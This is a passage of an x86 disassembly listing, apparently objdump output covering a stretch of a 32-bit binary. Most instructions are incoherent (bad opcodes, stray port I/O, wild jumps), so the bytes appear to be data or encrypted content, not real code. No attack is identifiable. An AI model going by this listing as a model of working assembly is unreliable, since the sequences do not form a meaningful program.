  40f55d:	ss out dx,eax
  40f55f:	jle    0x40f50a
  40f561:	mov    al,ds:0xc17fd088
  40f566:	cld    
  40f567:	lahf   
  40f568:	xlat   BYTE PTR ds:[ebx]
  40f569:	ja     0x40f511
  40f56b:	mov    edx,0x9d69ba4e
  40f570:	inc    ecx
  40f571:	out    0xaf,eax
  40f573:	jecxz  0x40f52f
  40f575:	pusha  
  40f576:	ins    BYTE PTR es:[edi],dx
  40f577:	xchg   esp,edi
  40f579:	sbb    ecx,esp
  40f57b:	dec    eax
  40f57c:	cdq    
  40f57d:	mov    esp,0x1528823f
  40f582:	lods   al,BYTE PTR ds:[esi]
  40f583:	lahf   
  40f584:	(bad)  
  40f585:	add    bl,BYTE PTR [edi-0x63927c94]
  40f58b:	cvtpi2ps xmm0,QWORD PTR [edx+0x14]
  40f58f:	dec    eax
  40f590:	adc    dh,BYTE PTR [ecx-0x38bb6e0d]
  40f596:	jle    0x40f55a
  40f598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f599:	mov    bl,al
  40f59b:	pop    eax
  40f59c:	inc    ecx
  40f59d:	dec    esp
  40f59e:	inc    esp
  40f59f:	sub    DWORD PTR [edi+0x49],0x25de400f
  40f5a6:	push   ss
  40f5a7:	adc    eax,0xf8b57f9c
  40f5ac:	in     eax,dx
  40f5ad:	jge    0x40f555
  40f5af:	fcomip st,st(0)
  40f5b1:	mov    eax,ds:0xc366928d
  40f5b6:	icebp  
  40f5b7:	fadd   QWORD PTR [edi]
  40f5b9:	stos   BYTE PTR es:[edi],al
  40f5ba:	or     al,BYTE PTR [edx+0x49]
  40f5bd:	lea    edx,[ecx+0x10]
  40f5c0:	lea    edx,[ecx+0x23]
  40f5c3:	push   ecx
  40f5c4:	pop    ds
  40f5c5:	xchg   esi,eax
  40f5c6:	sub    eax,0x98c7953d
  40f5cb:	cmp    ebx,eax
  40f5cd:	addr16 mov eax,0x5fbfbf88
  40f5d3:	or     al,0x8b
  40f5d5:	pop    edi
  40f5d6:	nop
  40f5d7:	ror    DWORD PTR ds:0x3a430beb,1
  40f5dd:	and    esi,DWORD PTR [edi-0x76]
  40f5e0:	cdq    
  40f5e1:	adc    esp,esp
  40f5e3:	or     esi,edi
  40f5e5:	in     eax,0xda
  40f5e7:	outs   dx,BYTE PTR ds:[esi]
  40f5e8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f5e9:	and    BYTE PTR [ebx+0x460e55f6],0x8b
  40f5f0:	xlat   BYTE PTR ds:[ebx]
  40f5f1:	(bad)  
  40f5f2:	mov    bl,0xff
  40f5f4:	pusha  
  40f5f5:	jne    0x40f5a9
  40f5f7:	cwde   
  40f5f8:	nop
  40f5f9:	pcmpeqd mm1,QWORD PTR [ebp+0x7f26544b]
  40f600:	loope  0x40f620
  40f602:	in     al,dx
  40f603:	push   ss
  40f604:	gs pop ds
  40f606:	xchg   ebx,eax
  40f607:	add    BYTE PTR [ecx],0x23
  40f60a:	mov    cl,0xed
  40f60c:	inc    edx
  40f60d:	ror    DWORD PTR [edx-0x4f],cl
  40f610:	pop    ebx
  40f611:	mov    al,BYTE PTR [edx-0x48]
  40f614:	mov    BYTE PTR [edx],ah
  40f616:	inc    edi
  40f617:	mov    WORD PTR [esp+ecx*1],ds
  40f61a:	lods   eax,DWORD PTR ds:[esi]
  40f61b:	fmul   st,st(2)
  40f61d:	mov    esi,0x46a84955
  40f622:	ret    
  40f623:	adc    cl,BYTE PTR [esi]
  40f625:	mov    al,0x8f
  40f627:	rol    BYTE PTR [ebx],1
  40f629:	(bad)  
  40f62a:	jo     0x40f5c6
  40f62c:	cli    
  40f62d:	fidivr DWORD PTR [ecx]
  40f62f:	jge    0x40f5fb
  40f631:	loopne 0x40f652
  40f633:	mov    ecx,0xb5592dd4
  40f638:	mov    bh,0x24
  40f63a:	fdiv   st,st(6)
  40f63c:	mov    dl,0x1
  40f63e:	pop    esi
  40f63f:	jg     0x40f68c
  40f641:	sbb    bh,BYTE PTR ds:0xf43729e6
  40f647:	test   DWORD PTR [edi],0x763980bc
  40f64d:	fidivr DWORD PTR [ebx+0x44]
  40f650:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f651:	push   edi
  40f652:	jno    0x40f603
  40f654:	nop
  40f655:	adc    al,0x61
  40f657:	or     esi,edx
  40f659:	lds    esi,FWORD PTR [esp+edx*8-0x15]
  40f65d:	fdivr  st,st(5)
  40f65f:	mov    ebp,0xc614ae42
  40f664:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f665:	and    DWORD PTR [edi],edx
  40f667:	fcom   DWORD PTR [esi+0x69]
  40f66a:	cld    
  40f66b:	adc    DWORD PTR [edx-0x4bc384e3],0xffffff9a
  40f672:	test   DWORD PTR [esi],0x8d841912
  40f678:	inc    eax
  40f679:	pop    ss
  40f67a:	or     al,0x18
  40f67c:	mov    eax,ds:0x182710c8
  40f681:	mov    BYTE PTR [edx-0x11e2f145],al
  40f687:	jne    0x40f644
  40f689:	inc    esi
  40f68a:	pop    ebp
  40f68b:	mov    dh,0x27
  40f68d:	in     eax,dx
  40f68e:	xchg   edi,eax
  40f68f:	dec    BYTE PTR [esi-0x79fb88ca]
  40f695:	test   DWORD PTR ss:[edx+0x33],edx
  40f699:	ins    BYTE PTR es:[edi],dx
  40f69a:	sub    al,dh
  40f69c:	stc    
  40f69d:	shl    BYTE PTR [ebp-0x5251ac6d],0x8c
  40f6a4:	jmp    0x40f683
  40f6a6:	dec    edi
  40f6a7:	cmp    dh,BYTE PTR [esi+0x66]
  40f6aa:	das    
  40f6ab:	fcmove st,st(7)
  40f6ad:	xchg   esi,eax
  40f6ae:	inc    esp
  40f6af:	push   esp
  40f6b0:	scas   eax,DWORD PTR es:[edi]
  40f6b1:	mov    ds,WORD PTR [esi+0x52132a7a]
  40f6b7:	push   ds
  40f6b8:	in     al,dx
  40f6b9:	pop    ds
  40f6ba:	push   ebx
  40f6bb:	out    dx,al
  40f6bc:	std    
  40f6bd:	hlt    
  40f6be:	lock dec edi
  40f6c0:	xchg   esp,eax
  40f6c1:	retf   0xf34f
  40f6c4:	add    eax,0x7496c49e
  40f6c9:	adc    DWORD PTR [ebx+0x3353c521],ecx
  40f6cf:	fnstsw WORD PTR [edi]
  40f6d1:	pop    es
  40f6d2:	adc    DWORD PTR [edx+0x3425bde8],0xcc12ec38
  40f6dc:	dec    esp
  40f6dd:	jnp    0x40f671
  40f6df:	cli    
  40f6e0:	jmp    0x9841ea2
  40f6e5:	into   
  40f6e6:	ret    
  40f6e7:	fisubr WORD PTR [esi*4+0x6fa1e516]
  40f6ee:	daa    
  40f6ef:	pushf  
  40f6f0:	inc    esi
  40f6f1:	in     eax,0xac
  40f6f3:	in     eax,dx
  40f6f4:	pop    es
  40f6f5:	add    edi,DWORD PTR [ebx+0x26137784]
  40f6fb:	mov    cl,0xe5
  40f6fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f6fe:	mov    ds:0x607be92e,eax
  40f703:	mov    edi,0x78dc2b2c
  40f708:	loop   0x40f696
  40f70a:	out    dx,eax
  40f70b:	pop    ds
  40f70c:	imul   DWORD PTR [ebx-0x2f]
  40f70f:	rcr    BYTE PTR ds:0x78d79c84,cl
  40f715:	stos   BYTE PTR es:[edi],al
  40f716:	in     al,0x7f
  40f718:	xchg   esp,eax
  40f719:	cmp    ch,BYTE PTR [ebx+0x2f]
  40f71c:	adc    al,0xa2
  40f71e:	popa   
  40f71f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f720:	jns    0x40f767
  40f722:	mov    eax,DWORD PTR [esi]
  40f724:	mov    edx,DWORD PTR [esi+0x4]
  40f727:	shrd   eax,edx,0x2
  40f72b:	mov    DWORD PTR [ebp+0x14],eax
  40f72e:	mov    eax,DWORD PTR [esi]
  40f730:	xor    DWORD PTR [ebp+0x14],edi
  40f733:	shr    edx,0x2
  40f736:	mov    edx,DWORD PTR [esi+0x4]
  40f739:	jmp    0x40fcc3
  40f73e:	inc    edx
  40f73f:	jecxz  0x40f7be
  40f741:	sbb    bl,BYTE PTR [eax+ebx*1]
  40f744:	sub    bl,dl
  40f746:	mov    esi,0x3db40793
  40f74b:	mov    DWORD PTR [edx+esi*4+0x161674e2],eax
  40f752:	cmp    eax,0xa1161604
  40f757:	adc    DWORD PTR [eax],esi
  40f759:	out    0x78,eax
  40f75b:	mov    ah,0x4e
  40f75d:	lahf   
  40f75e:	mov    esi,0xa3c4cbb
  40f763:	enter  0xb551,0xd8
  40f767:	psubw  mm5,QWORD PTR [ebx+0x2e817d1c]
  40f76e:	in     al,dx
  40f76f:	sbb    ah,ch
  40f771:	retf   
  40f772:	mov    ah,0xc4
  40f774:	push   eax
  40f775:	leave  
  40f776:	(bad)  
  40f777:	(bad)  
  40f778:	cmp    al,0x17
  40f77a:	and    DWORD PTR [ecx+ecx*4],0xffffffc7
  40f77e:	xlat   BYTE PTR ds:[ebx]
  40f77f:	adc    esp,ebx
  40f781:	scas   al,BYTE PTR es:[edi]
  40f782:	xor    bh,BYTE PTR [eax+ebp*4]
  40f785:	retf   
  40f786:	inc    ecx
  40f787:	leave  
  40f788:	mov    ecx,0xff3aec1
  40f78d:	add    eax,0xc4408877
  40f792:	mov    eax,0xefe85896
  40f797:	xchg   edi,eax
  40f798:	test   BYTE PTR [edi-0x1c],ch
  40f79b:	xor    al,0xfc
  40f79d:	sbb    al,0xd4
  40f79f:	ds jo  0x40f7cc
  40f7a2:	xor    eax,esp
  40f7a4:	push   0xffffffae
  40f7a6:	clc    
  40f7a7:	xor    dl,dl
  40f7a9:	inc    DWORD PTR [ebx-0x12]
  40f7ac:	and    ecx,DWORD PTR [ebp+0x4c18fd3e]
  40f7b2:	dec    edi
  40f7b3:	or     al,0xa
  40f7b5:	stc    
  40f7b6:	mov    ah,0xd4
  40f7b8:	(bad)  
  40f7b9:	and    eax,0x395c6510
  40f7be:	aam    0x65
  40f7c0:	sbb    edx,esp
  40f7c2:	xor    esi,ecx
  40f7c4:	jbe    0x40f83d
  40f7c6:	xchg   ecx,eax
  40f7c7:	or     DWORD PTR gs:[eax-0x34],esi
  40f7cb:	pushf  
  40f7cc:	sub    DWORD PTR [esp+eiz*2+0x2626bd27],esp
  40f7d3:	xchg   DWORD PTR [ecx+0x1f],esp
  40f7d6:	pushf  
  40f7d7:	push   ds
  40f7d8:	pop    eax
  40f7d9:	sbb    ecx,DWORD PTR [ebp+0x27]
  40f7dc:	mov    bh,ah
  40f7de:	ret    0xf2f1
  40f7e1:	arpl   WORD PTR [esi],bp
  40f7e3:	mov    eax,0x184d12c8
  40f7e8:	or     al,0xa9
  40f7ea:	enter  0x6c50,0x4d
  40f7ee:	push   edi
  40f7ef:	push   es
  40f7f0:	push   ds
  40f7f1:	pop    ss
  40f7f2:	push   es
  40f7f3:	mov    eax,0x9c91e2f8
  40f7f8:	or     esi,esp
  40f7fa:	add    al,0x5c
  40f7fc:	in     eax,0xd6
  40f7fe:	cmp    al,bh
  40f800:	sub    eax,0xd48def3c
  40f805:	imul   eax,DWORD PTR [edx],0xffffffd7
  40f808:	jno    0x40f862
  40f80a:	in     eax,0x38
  40f80c:	out    0x2a,eax
  40f80e:	loope  0x40f7d3
  40f810:	(bad)
  40f814:	repz frstor [ecx*8+0x3f413b8d]
  40f81c:	xlat   BYTE PTR ds:[ebx]
  40f81d:	inc    edx
  40f81e:	jb     0x40f833
  40f820:	fisubr DWORD PTR [eax*1+0x32710bda]
  40f827:	in     eax,0x84
  40f829:	inc    ecx
  40f82a:	inc    edx
  40f82b:	imul   eax,esp,0x6c5a2689
  40f831:	lods   eax,DWORD PTR ds:[esi]
  40f832:	lahf   
  40f833:	(bad)  
  40f835:	adc    cl,BYTE PTR [ebp-0x594048d0]
  40f83b:	push   esp
  40f83c:	mov    al,ds:0x4d6322e2
  40f841:	lea    esp,[ebx+0x2b3d9961]
  40f847:	pmovmskb ecx,mm1
  40f84a:	mov    bl,0xae
  40f84c:	test   eax,0xe928253a
  40f851:	jbe    0x40f863
  40f853:	fsub   QWORD PTR [ecx-0x4bf823ce]
  40f859:	jmp    0xe1f4212d
  40f85e:	sub    BYTE PTR [ecx+edi*4-0x5b44ce49],ah
  40f865:	out    dx,al
  40f866:	bswap  eax
  40f868:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f869:	jmp    0xbdb6900b
  40f86e:	mov    es,WORD PTR [eax-0x65]
  40f871:	xor    DWORD PTR ds:0x18e6a30b,edx
  40f877:	inc    ebp
  40f878:	push   ebp
  40f879:	and    edx,ebp
  40f87b:	adc    al,0xb3
  40f87d:	mov    ds:0x852d343f,al
  40f882:	cmp    BYTE PTR [esi+0x79],ch
  40f885:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f887:	test   al,0xf1
  40f889:	jmp    0x40f8e1
  40f88b:	sub    eax,0x9c3ea3bf
  40f890:	lock ds ins BYTE PTR es:[edi],dx
  40f893:	in     eax,dx
  40f894:	sub    eax,0xfa0c5925
  40f899:	push   edi
  40f89a:	and    edx,DWORD PTR [eax+edi*1+0x5b87d09d]
  40f8a1:	cmp    edi,ebp
  40f8a3:	add    ebp,esp
  40f8a5:	cmp    DWORD PTR [esi-0x41e2f804],edx
  40f8ab:	cmp    eax,0xc65d7435
  40f8b0:	inc    esi
  40f8b1:	cmp    DWORD PTR [edi],ecx
  40f8b3:	jmp    0x1706d454
  40f8b8:	in     al,0xac
  40f8ba:	out    dx,al
  40f8bb:	out    dx,eax
  40f8bc:	repnz dec ecx
  40f8be:	push   0x55a66d68
  40f8c3:	xchg   esi,eax
  40f8c4:	cmp    eax,0x82753ac8
  40f8c9:	inc    edi
  40f8ca:	cli    
  40f8cb:	cwde   
  40f8cc:	inc    ebp
  40f8cd:	sti    
  40f8ce:	add    ebx,DWORD PTR [edi-0x6]
  40f8d1:	(bad)  
  40f8d2:	dec    esi
  40f8d3:	popf   
  40f8d4:	into   
  40f8d5:	mov    al,ds:0x11f74d43
  40f8da:	add    ebp,DWORD PTR [edx-0x1d]
  40f8dd:	xchg   edx,eax
  40f8de:	(bad)
  40f8e1:	mov    BYTE PTR [edx-0x5],al
  40f8e4:	das    
  40f8e5:	ficom  WORD PTR [ecx+esi*4-0x25]
  40f8e9:	scas   eax,DWORD PTR es:[edi]
  40f8ea:	mov    esp,edx
  40f8ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40f8ed:	fcomp  QWORD PTR [ebx]
  40f8ef:	addr16 in eax,dx
  40f8f1:	arpl   WORD PTR [edi+0x1661ad92],si
  40f8f7:	mov    ch,0xc8
  40f8f9:	dec    ebx
  40f8fa:	jno    0x40f8af
  40f8fc:	out    0x52,al
  40f8fe:	fnstenv [ebx]
  40f900:	cmp    DWORD PTR [ebp-0x6220f708],edx
  40f906:	shl    DWORD PTR ds:0x22f55ac0,1
  40f90c:	fsubr  DWORD PTR fs:[ebp+0x727f34fe]
  40f913:	push   ebx
  40f914:	out    dx,eax
  40f915:	adc    eax,0xb4128b5d
  40f91a:	aad    0xd2
  40f91c:	gs leave 
  40f91e:	mov    ebx,0x55029396
  40f923:	aad    0x73
  40f925:	mov    WORD PTR [esi],cs
  40f927:	adc    eax,ebp
  40f929:	loope  0x40f935
  40f92b:	jnp    0x40f99f
  40f92d:	(bad)  
  40f92e:	fiadd  DWORD PTR [ebp-0x61]
  40f931:	add    esi,0xffffff85
  40f934:	adc    eax,0x2ee92864
  40f939:	or     eax,0xcfe3b2b5
  40f93e:	out    dx,eax
  40f93f:	fdivr  QWORD PTR [ebx]
  40f941:	pushf  
  40f942:	pop    edi
  40f943:	and    esi,DWORD PTR [ebx+0x1f247a28]
  40f949:	pop    es
  40f94a:	xchg   DWORD PTR ds:0xa30b57cd,ebp
  40f950:	out    dx,al
  40f951:	imul   eax,ebx,0xffffffaf
  40f954:	cmp    ebx,DWORD PTR [esi+0x38]
  40f957:	aas    
  40f958:	push   ss
  40f959:	ret    0x566c
  40f95c:	lahf   
  40f95d:	jns    0x40f9c1
  40f95f:	sub    bh,BYTE PTR [esp+edx*1-0x2cd9959a]
  40f966:	cld    
  40f967:	ss push esp
  40f969:	in     al,0xec
  40f96b:	jae    0x40f9b3
  40f96d:	xor    eax,DWORD PTR [ebp-0x4ff9d6a8]
  40f973:	scas   eax,DWORD PTR es:[edi]
  40f974:	mov    dh,0x26
  40f976:	cwde   
  40f977:	mov    al,ds:0xb35f9c45
  40f97c:	lahf   
  40f97d:	sbb    DWORD PTR [ebx+0x60],esp
  40f980:	jnp    0x40f9dc
  40f982:	sahf   
  40f983:	jmp    0x65875d1e
  40f988:	push   ebx
  40f989:	arpl   bp,ax
  40f98b:	retf   0x8a03
  40f98e:	arpl   WORD PTR [ebx-0x55],bp
  40f991:	jg     0x40f9d4
  40f993:	(bad)
  40f996:	in     al,dx
  40f997:	into   
  40f998:	stos   BYTE PTR es:[edi],al
  40f999:	fdiv   st,st(7)
  40f99b:	(bad)  
  40f99e:	aaa    
  40f99f:	int3   
  40f9a0:	xor    DWORD PTR [ebx+ebx*1-0x4d],esp
  40f9a4:	mov    DWORD PTR [eax+0x53],esp
  40f9a7:	jge    0x40fa14
  40f9a9:	and    esp,DWORD PTR [esi]
  40f9ab:	loop   0x40f957
  40f9ad:	jl     0x40f936
  40f9af:	xor    eax,0xf624dafb
  40f9b4:	pop    ebp
  40f9b5:	adc    al,0xde
  40f9b7:	enter  0x59e,0x24
  40f9bb:	inc    edi
  40f9bc:	sub    edi,DWORD PTR [ebp-0x1ab6ab6b]
  40f9c2:	sub    al,0xe4
  40f9c4:	imul   ebx,eax,0xffffff98
  40f9c7:	inc    ebp
  40f9c8:	mov    BYTE PTR [edi],bh
  40f9ca:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9cb:	std    
  40f9cc:	xor    BYTE PTR [esi+0x6d9fbd82],cl
  40f9d2:	stos   BYTE PTR es:[edi],al
  40f9d3:	jne    0x40f999
  40f9d5:	push   eax
  40f9d6:	dec    ebp
  40f9d7:	fcmovu st,st(7)
  40f9d9:	cmc    
  40f9da:	and    eax,0xcb58cadc
  40f9df:	and    DWORD PTR [edi+esi*1],ebx
  40f9e2:	stos   DWORD PTR es:[edi],eax
  40f9e3:	pushf  
  40f9e4:	lock adc ebp,DWORD PTR ds:0x56f8a1f8
  40f9eb:	sti    
  40f9ec:	jbe    0x40f97a
  40f9ee:	xlat   BYTE PTR ds:[ebx]
  40f9ef:	test   DWORD PTR [esi+0x4d432f1d],ebx
  40f9f5:	pusha  
  40f9f6:	mov    ?,WORD PTR [ebx-0x4b04d5]
  40f9fc:	(bad)  
  40f9fd:	cmp    esp,esi
  40f9ff:	lahf   
  40fa00:	xor    edi,0x37f072f1
  40fa06:	and    edx,DWORD PTR [esi-0x5b423645]
  40fa0c:	call   0x94dc554
  40fa11:	jge    0x40f9f4
  40fa13:	ret    0xacb8
  40fa16:	or     BYTE PTR [ebx],bl
  40fa18:	stos   BYTE PTR es:[edi],al
  40fa19:	sub    BYTE PTR [ebx+ebx*8],cl
  40fa1c:	test   BYTE PTR [edx+0x543320dc],cl
  40fa22:	xchg   DWORD PTR [edx+0x2a3a12b8],edi
  40fa28:	xor    al,0xa3
  40fa2a:	test   BYTE PTR [eax],al
  40fa2c:	lds    edi,FWORD PTR [ebp+0x77]
  40fa2f:	pop    es
  40fa30:	sbb    ecx,eax
  40fa32:	cmp    ebp,DWORD PTR [ebx-0x7545f624]
  40fa38:	fisubr WORD PTR [ecx-0x2d]
  40fa3b:	iret   
  40fa3c:	aas    
  40fa3d:	xor    al,0x9b
  40fa3f:	adc    eax,0x1c16ff6b
  40fa44:	aam    0x60
  40fa46:	xor    edx,edx
  40fa48:	add    bh,dl
  40fa4a:	cmc    
  40fa4b:	je     0x40fa9d
  40fa4d:	(bad)  
  40fa4e:	js     0x40fa41
  40fa50:	mov    BYTE PTR [ebp+0x5a],0x2a
  40fa54:	test   DWORD PTR [edi-0x1f],edi
  40fa57:	dec    ecx
  40fa58:	sub    al,0xa8
  40fa5a:	cld    
  40fa5b:	lods   eax,DWORD PTR ds:[esi]
  40fa5c:	mov    esp,0x5e9706cf
  40fa61:	mov    ecx,0x640a8e46
  40fa66:	ins    BYTE PTR es:[edi],dx
  40fa67:	pop    ebx
  40fa68:	xchg   bx,ax
  40fa6a:	(bad)  
  40fa6b:	sbb    al,0xfd
  40fa6d:	sub    eax,0x19d432a4
  40fa72:	pop    edi
  40fa73:	dec    edi
  40fa74:	adc    DWORD PTR [ebp+0x3f],0x9
  40fa78:	test   al,0x7d
  40fa7a:	dec    ebx
  40fa7b:	pop    ds
  40fa7c:	sbb    al,0x92
  40fa7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fa7f:	mov    edi,0x6202d63c
  40fa84:	mov    eax,ds:0x94031e2c
  40fa89:	shl    BYTE PTR [ebx],cl
  40fa8b:	jns    0x40fb0c
  40fa8d:	sti    
  40fa8e:	stos   DWORD PTR es:[edi],eax
  40fa8f:	ins    DWORD PTR es:[edi],dx
  40fa90:	leave  
  40fa91:	ds xchg ebp,eax
  40fa93:	inc    ecx
  40fa94:	je     0x40fa17
  40fa96:	mov    dh,0x74
  40fa98:	and    al,BYTE PTR [ebx-0x6f]
  40fa9b:	mov    esi,0x67018c43
  40faa0:	inc    esi
  40faa1:	add    al,0x21
  40faa3:	jno    0x40fb08
  40faa5:	adc    bl,BYTE PTR [esi+0x7243bfbd]
  40faab:	sbb    eax,0x39cba22a
  40fab0:	ja     0x40fa8f
  40fab2:	sub    BYTE PTR [esi],ah
  40fab4:	cmp    al,0x63
  40fab6:	mov    ah,0xc4
  40fab8:	push   ecx
  40fab9:	shr    DWORD PTR [esi],1
  40fabb:	xor    BYTE PTR [edi+eiz*8-0x2cab5269],dh
  40fac2:	push   esp
  40fac3:	pusha  
  40fac4:	dec    ebx
  40fac5:	loop   0x40fa4e
  40fac7:	aas    
  40fac8:	dec    ecx
  40fac9:	mov    edx,0xbb1d403e
  40face:	pop    esp
  40facf:	xchg   edx,eax
  40fad0:	imul   ebx,DWORD PTR [ecx+0x45],0x33a3c9d0
  40fad7:	icebp  
  40fad8:	jmp    0xfd0d8961
  40fadd:	add    eax,0x181be986
  40fae2:	out    0xff,al
  40fae4:	mov    eax,ds:0x678450a5
  40fae9:	sahf   
  40faea:	add    bh,BYTE PTR [eax-0x80]
  40faed:	push   cs
  40faee:	daa    
  40faef:	push   esi
  40faf0:	es ret 
  40faf2:	call   0x163e:0xdc68c00c
  40faf9:	mov    al,ds:0x5e1ee7c0
  40fafe:	ret    0xd274
  40fb01:	push   esp
  40fb02:	jae    0x40faa8
  40fb04:	jg     0x40fadb
  40fb06:	jns    0x40fac4
  40fb08:	sti    
  40fb09:	xor    al,0x87
  40fb0b:	arpl   sp,dx
  40fb0d:	or     DWORD PTR ds:0x3a46f9bc,0x7de3a1c6
  40fb17:	test   eax,0x2371f187
  40fb1c:	or     eax,0xbae37109
  40fb21:	inc    esp
  40fb22:	xchg   ecx,eax
  40fb23:	jmp    0x2e1eef02
  40fb28:	shl    BYTE PTR [ecx+0x3d],cl
  40fb2b:	xchg   DWORD PTR [ebp-0x75],esi
  40fb2e:	call   0x50b9:0x8d19c6c6
  40fb35:	sub    esi,DWORD PTR cs:[ebp+0x6d]
  40fb39:	sbb    eax,esp
  40fb3b:	jno    0x40fbb2
  40fb3d:	popa   
  40fb3e:	mov    bl,0xb2
  40fb40:	in     al,dx
  40fb41:	bound  ebp,QWORD PTR [ebx]
  40fb43:	adc    ecx,0xce79dad1
  40fb49:	pusha  
  40fb4a:	mov    eax,0x539a33d9
  40fb4f:	in     eax,dx
  40fb50:	cmp    ch,bh
  40fb52:	push   esp
  40fb53:	sub    ebx,DWORD PTR [edx-0x44]
  40fb56:	loope  0x40fb85
  40fb58:	jmp    esp
  40fb5a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fb5b:	inc    esp
  40fb5c:	xchg   ebp,eax
  40fb5d:	mov    ?,WORD PTR [ebp-0x25]
  40fb60:	std    
  40fb61:	stc    
  40fb62:	out    0x7c,al
  40fb64:	in     eax,dx
  40fb65:	add    ch,BYTE PTR [ecx-0x8]
  40fb68:	inc    esp
  40fb69:	mov    ebp,0xefc526c9
  40fb6e:	mul    BYTE PTR [eax-0x5b5fe32f]
  40fb74:	gs mov bl,0x84
  40fb77:	pop    ss
  40fb78:	mov    eax,0xd055eebb
  40fb7d:	dec    ecx
  40fb7e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb7f:	and    BYTE PTR [ecx-0x4d],0x91
  40fb83:	pop    ebp
  40fb84:	add    BYTE PTR [edi+0x76a3ded4],0x74
  40fb8b:	inc    eax
  40fb8c:	pop    ss
  40fb8d:	outs   dx,DWORD PTR ds:[esi]
  40fb8e:	daa    
  40fb8f:	scas   al,BYTE PTR es:[edi]
  40fb90:	jp     0x40fc01
  40fb92:	mul    ch
  40fb94:	(bad)  
  40fb95:	loopne 0x40fb1e
  40fb97:	(bad)  
  40fb98:	(bad)  
  40fb9a:	scas   eax,DWORD PTR es:[edi]
  40fb9b:	add    eax,0x1bc2710d
  40fba0:	dec    ebp
  40fba1:	inc    esp
  40fba2:	dec    esp
  40fba3:	pop    esp
  40fba4:	in     al,dx
  40fba5:	sub    bl,BYTE PTR [esi+eiz*8+0xb]
  40fba9:	add    al,0x75
  40fbab:	pop    es
  40fbac:	adc    esp,DWORD PTR [esi-0x348daada]
  40fbb2:	cmp    DWORD PTR [esi],ebp
  40fbb4:	icebp  
  40fbb5:	jge    0x40fb7a
  40fbb7:	pop    esi
  40fbb8:	and    al,0x27
  40fbba:	adc    al,0x7c
  40fbbc:	and    DWORD PTR [edi+0x64],eax
  40fbbf:	ficomp WORD PTR [ecx+0x2]
  40fbc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fbc3:	jp     0x40fbd8
  40fbc5:	pop    eax
  40fbc6:	call   0xd253:0xd301ff28
  40fbcd:	adc    DWORD PTR [ecx-0x4a050b9a],0xffffffec
  40fbd4:	je     0x40fba8
  40fbd6:	fcmovnb st,st(1)
  40fbd8:	or     eax,0x8ef97182
  40fbdd:	ss xchg edx,eax
  40fbdf:	pop    es
  40fbe0:	sub    bh,BYTE PTR [edi+0x1b]
  40fbe3:	or     BYTE PTR [ecx+0xa],dh
  40fbe6:	dec    ebp
  40fbe7:	rcr    ch,1
  40fbe9:	mov    dh,0x5e
  40fbeb:	jno    0x40fbc7
  40fbed:	shr    DWORD PTR [edi],1
  40fbef:	or     eax,0xf69cb341
  40fbf4:	adc    al,0x21
  40fbf6:	cmc    
  40fbf7:	mov    al,0x26
  40fbf9:	sub    ebp,DWORD PTR [ebx]
  40fbfb:	stc    
  40fbfc:	xlat   BYTE PTR ds:[ebx]
  40fbfd:	add    al,0x12
  40fbff:	call   0x8cfb6fca
  40fc04:	sub    eax,0x31026c71
  40fc09:	icebp  
  40fc0a:	xor    BYTE PTR [esi+0x5fad34ee],bh
  40fc10:	or     DWORD PTR [ecx-0x626d91fb],edi
  40fc16:	mov    dh,0xe7
  40fc18:	cmp    DWORD PTR [ebx],esi
  40fc1a:	int    0x61
  40fc1c:	sbb    BYTE PTR [ecx+0x12],0xe
  40fc20:	mov    esi,0xb520948f
  40fc25:	pop    edx
  40fc26:	retf   
  40fc27:	(bad)  
  40fc28:	std    
  40fc29:	shr    dl,cl
  40fc2b:	retf   
  40fc2c:	push   cs
  40fc2d:	shl    BYTE PTR es:[edx-0x7f6faa0c],1
  40fc34:	inc    edx
  40fc35:	sbb    DWORD PTR [eax+0x31ab5067],edx
  40fc3b:	cmp    dh,BYTE PTR ds:0xdad5d518
  40fc41:	in     eax,dx
  40fc42:	test   DWORD PTR [eax+0x2508e641],eax
  40fc48:	jb     0x40fcc4
  40fc4a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40fc4b:	inc    edx
  40fc4c:	lea    esp,[ebx]
  40fc4e:	jbe    0x40fcc0
  40fc50:	jmp    0x40fc7f
  40fc52:	popa   
  40fc53:	pop    ebx
  40fc54:	cmp    BYTE PTR ds:[eax-0x5d],cl
  40fc58:	mov    BYTE PTR [esi-0x7a],ah
  40fc5b:	std    
  40fc5c:	mov    dl,0x88
  40fc5e:	dec    edx
  40fc5f:	stc    
  40fc60:	bnd jns 0x40fc85
  40fc63:	idiv   BYTE PTR [esi]
  40fc65:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc66:	sub    DWORD PTR [bx+si+0x65bc],ebx
  40fc6b:	sbb    BYTE PTR [ebp-0x6eb28654],ah
  40fc71:	mov    esi,0xc2ef84eb
  40fc76:	shl    BYTE PTR [ebp+ecx*8-0x742586a5],cl
  40fc7d:	push   0x146eef09
  40fc82:	scas   al,BYTE PTR es:[edi]
  40fc83:	aas    
  40fc84:	nop
  40fc85:	fbstp  TBYTE PTR [ecx-0x685e322a]
  40fc8b:	dec    ecx
  40fc8c:	push   ss
  40fc8d:	hlt    
  40fc8e:	jge    0x40fc44
  40fc90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fc91:	cmp    al,0x8d
  40fc93:	lea    esi,[ecx+ebx*8-0x5d]
  40fc97:	mov    ch,0x98
  40fc99:	xchg   edx,eax
  40fc9a:	mov    eax,0xd35a6338
  40fc9f:	jno    0x40fca7
  40fca1:	xchg   ebx,eax
  40fca2:	jmp    DWORD PTR [ecx]
  40fca4:	imul   esi,DWORD PTR [esi-0x62dc671a],0x3f90d40d
  40fcae:	sahf   
  40fcaf:	mov    esp,0x2d2b856
